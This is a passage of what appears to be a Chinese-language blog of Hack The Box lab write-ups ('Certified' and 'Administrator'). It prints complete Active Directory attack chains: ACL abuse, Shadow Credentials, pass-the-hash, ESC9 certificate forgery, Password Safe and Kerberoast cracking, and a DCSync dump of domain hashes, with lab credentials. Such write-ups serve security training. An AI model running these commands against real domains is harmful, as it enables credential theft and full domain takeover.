valid before: 2024-05-13T15:49:36\r|_Not valid after: 2025-05-13T15:49:36\r|_ssl-date: 2024-12-06T18:50:32+00:00; +6h45m59s from scanner time.\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\r|_ssl-date: 2024-12-06T18:50:32+00:00; +6h45m59s from scanner time.\r| ssl-cert: Subject: commonName=DC01.certified.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\r| Not valid before: 2024-05-13T15:49:36\r|_Not valid after: 2025-05-13T15:49:36\r3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=DC01.certified.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\r| Not valid before: 2024-05-13T15:49:36\r|_Not valid after: 2025-05-13T15:49:36\r|_ssl-date: 2024-12-06T18:50:32+00:00; +6h45m59s from scanner time.\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-server-header: Microsoft-HTTPAPI/2.0\r|_http-title: Not Found\r9389/tcp open mc-nmf .NET Message Framing\r49666/tcp open msrpc Microsoft Windows RPC\r49668/tcp open msrpc Microsoft Windows RPC\r49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49674/tcp open msrpc Microsoft Windows RPC\r49683/tcp open msrpc Microsoft Windows RPC\r49715/tcp open msrpc Microsoft Windows RPC\r49737/tcp open msrpc Microsoft Windows RPC\r49772/tcp open msrpc Microsoft Windows RPC\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-time: | date: 2024-12-06T18:49:56\r|_ start_date: N/A\r|_clock-skew: mean: 6h45m58s, deviation: 0s, median: 6h45m58s\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 254.91 seconds GetAllUserName #\r┌──(root㉿kali)-[~kali/Certified]\r└─# crackmapexec smb certified.htb -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --rid-brute | grep SidTypeUser\rSMB Certified.htb 445 DC01 500: CERTIFIED\\Administrator (SidTypeUser)\rSMB Certified.htb 445 DC01 501: CERTIFIED\\Guest (SidTypeUser)\rSMB Certified.htb 445 DC01 502: CERTIFIED\\krbtgt (SidTypeUser)\rSMB Certified.htb 445 DC01 1000: CERTIFIED\\DC01$ (SidTypeUser)\rSMB Certified.htb 445 DC01 1103: CERTIFIED\\judith.mader (SidTypeUser)\rSMB Certified.htb 445 DC01 1105: CERTIFIED\\management_svc(SidTypeUser)\rSMB Certified.htb 445 DC01 1106: CERTIFIED\\ca_operator (SidTypeUser)\rSMB Certified.htb 445 DC01 1601: CERTIFIED\\alexander.huges (SidTypeUser)\rSMB Certified.htb 445 DC01 1602: CERTIFIED\\harry.wilson (SidTypeUser)\rSMB Certified.htb 445 DC01 1603: CERTIFIED\\gregory.cameron (SidTypeUser) Bloodhound #\r┌──(root㉿kali)-[~kali/Certified]\r└─# bloodhound-python -u judith.mader -p \u0026#39;judith09\u0026#39; -c All -d certified.htb -ns 10.10.11.41 INFO: Found AD domain: certified.htb\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\rINFO: Connecting to LDAP server: dc01.certified.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.certified.htb\rINFO: Found 10 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: DC01.certified.htb\rINFO: Done in 00M 17S 导入到bloodhoundGUI里面进行分析\n发现Judith用户可以更改 Management 组的所有者或修改该组的访问控制列表 (ACL)\nManagement组可以对其中的SVC进行写入\nSVC可以完全控制CA_OPERATOR\nUser #\r修改 Management 组的 ACL，授予 judith.mader 用户 WriteMembers 权限，使其能够管理该组的成员\n┌──(root㉿kali)-[~kali/Certified]\r└─# impacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -target-dn \u0026#34;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB\u0026#34; -principal \u0026#34;judith.mader\u0026#34; \u0026#34;certified.htb/judith.mader:judith09\u0026#34;\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] DACL backed up to dacledit-20241206-205722.bak\r[*] DACL modified successfully!\r把Judith自己加入到Management组里面\n┌──(root㉿kali)-[/home/kali/Certified]\r└─# bloodyAD --host 10.10.11.41 -d \u0026#39;certified.htb\u0026#39; -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; add groupMember \u0026#34;Management\u0026#34; \u0026#34;judith.mader\u0026#34;\r[+] judith.mader added to Management 域持久性：Shadow Credentials - FreeBuf网络安全行业门户\nKillingTree/pywhisker: Python version of the C# tool for \u0026ldquo;Shadow Credentials\u0026rdquo; attacks (github.com)\n这个工具如果出现args的报错，要到main()函数中添加globals args，在args的parse调用之前\n使用 pywhisker.py 工具进行 Kerberos 认证绕过操作，并且通过修改目标对象的 msDS-KeyCredentialLink 属性来生成并存储与目标相关的证书和密钥\n┌──(root㉿kali)-[/home/kali/Certified/pywhisker/pywhisker]\r└─# python pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p judith09 --target management_svc --action add\r[*] Searching for the target account\r[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb\r[*] Generating certificate\r[*] Certificate generated\r[*] Generating KeyCredential\r[*] KeyCredential generated with DeviceID: 7ba66598-d473-200b-e335-73693201fe6a\r[*] Updating the msDS-KeyCredentialLink attribute of management_svc\r[+] Updated the msDS-KeyCredentialLink attribute of the target object\r[+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: oigNgAOY.pfx\r[*] Must be used with password: F7ddKVbzqkaPtLgqVxFX\r[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools\r然后请求获取management_svc的TGT票据，如果报错需要使用ntpdate同步时区\n使用 PKINITtools 中的 gettgtpkinit.py 脚本来请求一个 Kerberos TGT（Ticket Granting Ticket），并且使用了之前生成的证书和密钥\n┌──(root㉿kali)-[/home/kali/Certified/PKINITtools]\r└─# python gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/oigNgAOY.pfx -pfx-pass F7ddKVbzqkaPtLgqVxFX certified.htb/management_svc hhh.ccache\r2024-12-08 18:59:06,443 minikerberos INFO Loading certificate and key from file\rINFO:minikerberos:Loading certificate and key from file\r2024-12-08 18:59:06,456 minikerberos INFO Requesting TGT\rINFO:minikerberos:Requesting TGT\r2024-12-08 18:59:28,228 minikerberos INFO AS-REP encryption key (you might need this later):\rINFO:minikerberos:AS-REP encryption key (you might need this later):\r2024-12-08 18:59:28,228 minikerberos INFO 07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6\rINFO:minikerberos:07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6\r2024-12-08 18:59:28,230 minikerberos INFO Saved TGT to file\rINFO:minikerberos:Saved TGT to file 设置环境变量\n┌──(root㉿kali)-[/home/kali/Certified/PKINITtools]\r└─# export KRB5CCNAME=/home/kali/Certified/PKINITtools/hhh.ccache\r使用 PKINITtools 中的 getnthash.py 脚本，通过已经获得的 TGT 来请求并恢复 management_svc 账户的 NT hash\n┌──(root㉿kali)-[/home/kali/Certified/PKINITtools]\r└─# python getnthash.py -key 07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6 certified.htb/management_svc\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache\r/home/kali/Certified/PKINITtools/getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow()\r/home/kali/Certified/PKINITtools/getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[*] Requesting ticket to self with PAC\rRecovered NT Hash\ra091c1832bcdd4677c28b5a6a1295584 有了NThash就可以使用Evil-winrm远程登录\n┌──(root㉿kali)-[/home/kali/Certified/PKINITtools]\r└─# evil-winrm -i certified.htb -u management_svc -H \u0026#34;a091c1832bcdd4677c28b5a6a1295584\u0026#34;\rEvil-WinRM shell v3.7\rWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\rInfo: Establishing connection to remote endpoint\r*Evil-WinRM* PS C:\\Users\\management_svc\\Documents\u0026gt; cd ../desktop\r*Evil-WinRM* PS C:\\Users\\management_svc\\desktop\u0026gt; cat user.txt Root #\rmanagement_svc可以完全控制ca_operator\n尝试修改ca的密码\n┌──(root㉿kali)-[/home/kali/Certified/PKINITtools]\r└─# pth-net rpc password \u0026#34;ca_operator\u0026#34; \u0026#34;12345678\u0026#34; -U \u0026#34;certified.htb\u0026#34;/\u0026#34;management_svc\u0026#34;%\u0026#34;a091c1832bcdd4677c28b5a6a1295584\u0026#34;:\u0026#34;a091c1832bcdd4677c28b5a6a1295584\u0026#34; -S \u0026#34;DC01.certified.htb\u0026#34;\rE_md4hash wrapper called.\rHASH PASS: Substituting user supplied NTLM HASH... 检查是否修改成功\n┌──(root㉿kali)-[/home/kali/Certified/PKINITtools]\r└─# nxc smb 10.10.11.41 -u ca_operator -p 12345678 SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) SMB 10.10.11.41 445 DC01 No Security Extension - ESC9 #\rAD CS Domain Escalation | HackTricks 是使用 Certipy 工具查找和获取与 judith.mader@certified.htb 用户相关的证书信息，并获取 certified-DC01-CA 证书颁发机构 (CA) 的配置\n┌──(root㉿kali)-[/home/kali/Certified]\r└─# certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Finding certificate templates\r[*] Found 34 certificate templates\r[*] Finding certificate authorities\r[*] Found 1 certificate authority\r[*] Found 12 enabled certificate templates\r[*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA\r[!] Got error while trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\r[*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via RRP\r[!] Failed to connect to remote registry. Service should be starting now. Trying again...\r[*] Got CA configuration for \u0026#39;certified-DC01-CA\u0026#39;\r[*] Saved BloodHound data to \u0026#39;20241208202644_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k\r[*] Saved text output to \u0026#39;20241208202644_Certipy.txt\u0026#39;\r[*] Saved JSON output to \u0026#39;20241208202644_Certipy.json\u0026#39; 发现存在NoSecurityExtension，因此可以使用ESC9来进行攻击\n使用 Certipy 工具将 NT hash (a091c1832bcdd4677c28b5a6a1295584) 更新到 ca_operator 账户，并修改了该账户的 userPrincipalName (UPN) 为 Administrator\n┌──(root㉿kali)-[/home/kali/Certified]\r└─# certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Updating user \u0026#39;ca_operator\u0026#39;:\ruserPrincipalName : Administrator\r[*] Successfully updated \u0026#39;ca_operator\u0026#39; 成功请求到一个证书，且该证书与 Administrator 账户关联（尽管请求的是 ca_operator 用户）。这意味着，现在有了一个可以代表 Administrator 账户的证书。\n┌──(root㉿kali)-[/home/kali/Certified]\r└─# certipy-ad req -username ca_operator@certified.htb -p 12345678 -ca certified-DC01-CA -template CertifiedAuthentication -debug Certipy v4.8.2 - by Oliver Lyak (ly4k)\r[+] Trying to resolve \u0026#39;CERTIFIED.HTB\u0026#39; at \u0026#39;192.168.237.2\u0026#39;\r[+] Resolved \u0026#39;CERTIFIED.HTB\u0026#39; from cache: 10.10.11.41\r[+] Generating RSA key\r[*] Requesting certificate via RPC\r[+] Trying to connect to endpoint: ncacn_np:10.10.11.41[\\pipe\\cert]\r[+] Connected to endpoint: ncacn_np:10.10.11.41[\\pipe\\cert]\r[*] Successfully requested certificate\r[*] Request ID is 4\r[*] Got certificate with UPN \u0026#39;Administrator\u0026#39;\r[*] Certificate has no object SID\r[*] Saved certificate and private key to \u0026#39;administrator.pfx\u0026#39; 使用 Certipy 工具，通过 administrator.pfx 证书文件以 administrator@certified.htb 用户身份进行 Kerberos 认证，并成功获取 TGT 和 NT hash\n┌──(root㉿kali)-[/home/kali/Certified]\r└─# certipy-ad auth -pfx administrator.pfx -domain certified.htb\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Using principal: administrator@certified.htb\r[*] Trying to get TGT...\r[*] Got TGT\r[*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39;\r[*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39;\r[*] Got hash for \u0026#39;administrator@certified.htb\u0026#39;: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34\r最后通过evil-winrm登录获取到root.txt\n┌──(root㉿kali)-[/home/kali/Certified]\r└─# evil-winrm -i certified.htb -u administrator -H \u0026#34;0d5b49608bbce1751f708748f67e2d34\u0026#34; Evil-WinRM shell v3.7\rWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\rInfo: Establishing connection to remote endpoint\r*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ../desktop\r*Evil-WinRM* PS C:\\Users\\Administrator\\desktop\u0026gt; cat root.txt Summary #\r这个machine是主要关于AD域内证书的\nUSER：judith具有WriteOwner权限可以将自己写入这个组，由于Management组对svc的权限可以写入，因此修改了他的 msDS-KeyCredentialLink 属性，然后获取svc的TGT，最终恢复他的NThash\nROOT：首先检查了judith的证书配置，发现存在ESC9，由于management_svc对ca_operator具有GenericAll权限，因此可以修改其密码，以及userPrincipalName修改为administrator。(某种程度上，svc 账户如果在证书颁发机构（CA）上拥有 GenericAll 或其他高级权限，它就可以实现类似于管理员的控制，特别是在证书管理和属性更改方面)。请求ca获取到代表administrator的证书，最后通过这个伪证书获取到administrator的NThash。\n","date":"2024-12-08","externalUrl":null,"permalink":"/posts/2024/12/htb-certified/","section":"Posts","summary":"","title":"HTB-Certified","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich\nNmap #\r┌──(root㉿kali)-[/home/kali/Administrator]\r└─# nmap -sSCV -Pn administrator.htb\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 15:51 CST\rNmap scan report for administrator.htb (10.10.11.42)\rHost is up (0.072s latency).\rNot shown: 988 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r21/tcp open ftp Microsoft ftpd\r| ftp-syst: |_ SYST: Windows_NT\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-05 14:37:40Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_clock-skew: 6h46m00s\r| smb2-time: | date: 2024-12-05T14:37:51\r|_ start_date: N/A Crackmapexec #\r通过SMB服务，获取到了当前存在的用户信息\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# crackmapexec smb administrator.htb -u \u0026#34;Olivia\u0026#34; -p \u0026#34;ichliebedich\u0026#34; --rid-brute | grep SidTypeUser\rSMB administrator.htb 445 DC 500: ADMINISTRATOR\\Administrator (SidTypeUser)\rSMB administrator.htb 445 DC 501: ADMINISTRATOR\\Guest (SidTypeUser)\rSMB administrator.htb 445 DC 502: ADMINISTRATOR\\krbtgt (SidTypeUser)\rSMB administrator.htb 445 DC 1000: ADMINISTRATOR\\DC$ (SidTypeUser)\rSMB administrator.htb 445 DC 1108: ADMINISTRATOR\\olivia (SidTypeUser)\rSMB administrator.htb 445 DC 1109: ADMINISTRATOR\\michael (SidTypeUser)\rSMB administrator.htb 445 DC 1110: ADMINISTRATOR\\benjamin (SidTypeUser)\rSMB administrator.htb 445 DC 1112: ADMINISTRATOR\\emily (SidTypeUser)\rSMB administrator.htb 445 DC 1113: ADMINISTRATOR\\ethan (SidTypeUser)\rSMB administrator.htb 445 DC 3601: ADMINISTRATOR\\alexander (SidTypeUser)\rSMB administrator.htb 445 DC 3602: ADMINISTRATOR\\emma (SidTypeUser) Bloodhound #\r┌──(root㉿kali)-[/home/kali/Administrator]\r└─# bloodhound-python -u Olivia -p \u0026#39;ichliebedich\u0026#39; -c All -d administrator.htb -ns 10.10.11.42\rINFO: Found AD domain: administrator.htb\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known\rINFO: Connecting to LDAP server: dc.administrator.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc.administrator.htb\rINFO: Found 11 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: dc.administrator.htb\rINFO: Done in 00M 14S 添加dc.administrator.htb到/etc/hosts\n经过分析Olivia是可以控制michael的\nMichael可以强制修改Benjamin的密码\nUser #\r首先先修改Michael的密码\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# bloodyAD -u \u0026#34;olivia\u0026#34; -p \u0026#34;ichliebedich\u0026#34; -d \u0026#34;Administrator.htb\u0026#34; --host \u0026#34;10.10.11.42\u0026#34; set password \u0026#34;Michael\u0026#34; \u0026#34;12345678\u0026#34;\r[+] Password changed successfully! 然后用Michael的账户去修改Benjamin的密码\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# bloodyAD -u \u0026#34;Michael\u0026#34; -p \u0026#34;12345678\u0026#34; -d \u0026#34;Administrator.htb\u0026#34; --host \u0026#34;10.10.11.42\u0026#34; set password \u0026#34;Benjamin\u0026#34; \u0026#34;12345678\u0026#34;\r[+] Password changed successfully! 使用FTP登录，发现存在备份文件\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# ftp administrator.htb Connected to administrator.htb.\r220 Microsoft FTP Service\rName (administrator.htb:kali): Benjamin\r331 Password required\rPassword: 230 User logged in.\rRemote system type is Windows_NT.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||62217|)\r125 Data connection already open; Transfer starting.\r10-05-24 08:13AM 952 Backup.psafe3\r226 Transfer complete.\rftp\u0026gt; get Backup.psafe3\rlocal: Backup.psafe3 remote: Backup.psafe3\r229 Entering Extended Passive Mode (|||62224|)\r125 Data connection already open; Transfer starting.\r100% |*******************************************************************| 952 7.19 KiB/s 00:00 ETA\r226 Transfer complete.\rWARNING! 3 bare linefeeds received in ASCII mode.\rFile may not have transferred correctly.\r952 bytes received in 00:00 (4.76 KiB/s)\rftp\u0026gt; exit\r221 Goodbye psafe3文件是加密的密码安全文件\n无法直接读取，需要使用pwsafe2john工具进行获取hash，卡kali自带有\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# pwsafe2john Backup.psafe3 Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050 拿到hash，尝试进行解密\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])\rCost 1 (iteration count) is 2048 for all loaded hashes\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rtekieromucho (Backu) 1g 0:00:00:00 DONE (2024-12-05 23:24) 4.761g/s 29257p/s 29257c/s 29257C/s newzealand..iheartyou\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. 得到密码是tekieromucho\n安装Passwordsafe到kali中，然后用密码打开这个文件\n将三个用户的PASSWORD复制下来\nalexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw\remily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb\remma:WwANQWnmJnGV07WQN8bMS7FMAbjNur 由于目标机器上的5985端口是开放的，可以使用evil-winrm远程登录\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# evil-winrm -i administrator.htb -u emily -p \u0026#34;UXLCI5iETUsIBoFVTj8yQFKoHjXmb\u0026#34; Privilege Escalation #\rEmliy对Ethan可以权限写入\nOwn Ethan #\r因为Emliy对Ethan的权限，可以使用Targeted Kerberoasting攻击\ntargetedKerberoast 是一个 Python 脚本，与许多其他脚本（例如 GetUserSPNs.py）一样，它可以为设置了 SPN 的用户帐户打印 “kerberoast” 哈希值。 该工具带来了以下附加功能：对于每个没有 SPN 的用户，它会尝试设置一个（滥用对属性的写入权限），打印 “kerberoast” 哈希，并删除为该操作设置的临时 SPN。\n[github author=\u0026ldquo;ShutdownRepo\u0026rdquo; project=\u0026ldquo;targetedKerberoast\u0026rdquo;][/github]\n┌──(root㉿kali)-[/home/kali/Administrator/targetedKerberoast]\r└─# python targetedKerberoast.py -u \u0026#34;emily\u0026#34; -p \u0026#34;UXLCI5iETUsIBoFVTj8yQFKoHjXmb\u0026#34; -d \u0026#34;Administrator.htb\u0026#34; --dc-ip 10.10.11.42\r[*] Starting kerberoast attacks\r[*] Fetching usernames from Active Directory with LDAP\r[+] Printing hash for (ethan)\r$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$15ec7606ffa3297b86b280475f514f9c$2e4d87fb991fa421183d34d1f57dc6eff6cf90d47f165e99e8caa4042a91278d9ae1897d9b5bd1c4938ae952b02b253b63207405bb7f66b8509c614b4e8a0fe9bff6e4ae67a8c6df5ce80d08d1e2f0cc78389f94289f4fe121f402cf1d8a411db8e49116ae92534989d03f740899d01f2f264273ad4da38a5537fde4c4d629961839c4a7916a3f246240ce1e50602d648a17d05384131d1729c9debfe576e9a37bf347899896e9df8bec3b2ac16110da971e0142ef5435bb73ee2fca6baf923ad26540ff42b735d73ff730cdb075026d0646247db541b3c824a2c8fef6c72572d06c64f341778b0456cbf6376f22bc444228cc4fef86c8bb62093c7081daf6ab75c809508c2ca0ab0fe679e1dbbd753441316d58d1245fdcd9e1b8ef58faa2c71ae319296eeda923da7a42677e65a7ab048b694ea8f880bb021740f94eb4f9b1416d37cd75f41c2b9d045370890611857ae2576e117c1ca52de93918d7104e95c95cd130b2d06805d6c99d5c13b61ab0040f02117accc14a8ad06e2f6d66103c07e9e96a6a2a94f4a12e34e9c3f8b46a305e778a17958128465967076c0365d7c87bb6c517d8ab27d1a89f582a72e303bf0ac54c1c7d2fbe80b2500cab320cdbac803fdfa2c8a54e8db9870a5dd73193a85878752373da71d223e8cdd47dcd2ba3c3b353bc5f1af493da902c90b5a26a218aa6875ff9ffa5bc8bc2f1f90d65502819f01f3c8539950c1d905b2bd803145cfd603a6d75a654ce2c83210b59ed9e6c232841a7d6f5e706072e8e9ed38baaf4c04640841726e61a7f484e900ef1515480ba9b337f80c9cc9d0f974aff33b83897d340a925ab084d60914f708eb5cb917c91ecb362b490f2da965fc476956c7f2d9968ed61b10bdacd2c371955253ebbddfbfc97ee2b38badec0413bca0ec1e11aa44429c6d3d9ab73aaa4a1425fbf23123260c42ed28229e3b766ed0c5682eb6b097b315f72b8ce387978525b3800229f5a0980de2b1f947168c6956d06c8ad9178aefd34addba5e3c9f719619aa29301579cd426415ae8c9d832a93ce3beccf70b58340e949b12e9e6d9d7ef80a3b5852f0e372ba786237cb3f6b2a2738a3b70fd070f5ecd59e5cab52cb145113fc0f4832ba7adc297d6a01167773f9a9a3a5302a0c6a672b1437372d349752350778db5dcdb5f986a7b3110d2584d12a21d32960c061d0f5a60f182257b8954fcd13936b14ef1c6cd5396b2d3549971d83ef116fe4e65916c73f7d231e1c7c99bd82854b152c016f663ecc4c962a30dce3569f088398f8d230996901bfa72f3427ede4d73d1f7b8828fe098c958867c3bd9017002c3e74fbe73650d05228039b57c916ae017e89859afb79c9fb951c815476495819840ae9468fdb66d6ee687de54fed4724c77eee4bd4f9b4995005f644e2b1a58f87deb91088ec9e318fe9d1f6b34a33f6e2e001c2a0e3c0d7f463376a5e3827fadf2a88d6f79d73188b207e06b3207700a5929dd3b6d7fe47bb71402d1881a49a990f0472d912937b66825 如果上面无法执行，可以尝试同步时区，因为Kerberos的认证对时间校准很严格\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# ntpdate administrator.htb 解密hash\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rlimpbizkit (?) 1g 0:00:00:00 DONE (2024-12-06 17:35) 100.0g/s 512000p/s 512000c/s 512000C/s newzealand..babygrl\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. 得到Ethan的密码：limpbizkit\n检查Ethan\nAblout DCSync #\rFrom here: DCSync(bloodhoundenterprise.io)\n此边缘表示 GetChanges 和 GetChangesAll 的组合。这两个权限的组合授予主体执行 DCSync 攻击的能力。\n通过这个来获取Administrator的密码hash\nsecretsdump #\rSecretsdump.py 是 Impacket 框架中的一个脚本，该脚本也可以通过 DCSync 技术导出域控制器上用户的哈希。该工具的原理是首先使用提供的用户登录凭据通过 smbexec 或者 wmiexec 远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的哈希，同时通过 Dcsync 或从 NTDS.dit 文件中导出所有域用户的哈希。其最大的优点是支持从域外的计算机连接至域控制器。\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# impacket-secretsdump \u0026#34;Administrator.htb/ethan:limpbizkit\u0026#34;@\u0026#34;dc.Administrator.htb\u0026#34;\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Using the DRSUAPI method to get NTDS.DIT secrets\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::\radministrator.htb\\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::\radministrator.htb\\michael:1109:aad3b435b51404eeaad3b435b51404ee:d023170ba78a12d11621d96043280763:::\radministrator.htb\\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:d023170ba78a12d11621d96043280763:::\radministrator.htb\\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::\radministrator.htb\\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::\radministrator.htb\\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::\radministrator.htb\\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::\rDC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::\r[*] Kerberos keys 